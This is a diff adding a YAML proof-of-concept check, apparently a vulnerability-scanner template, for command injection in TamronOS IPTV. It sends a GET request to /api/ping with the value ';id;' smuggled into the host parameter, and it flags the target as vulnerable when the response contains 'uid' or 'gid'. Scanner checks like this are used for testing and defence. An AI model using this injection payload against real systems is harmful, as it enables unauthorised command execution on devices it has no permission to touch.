@@ -1,0 +1,10 @@
+name: poc-yaml-TamronOS-IPTV-cmd
+description: "可任意执行命令"
+method: GET
+path:
+  - /api/ping?count=5&host=;id;
+expression:
+  status: 200
+  body_any:
+    - "uid"
+    - "gid"
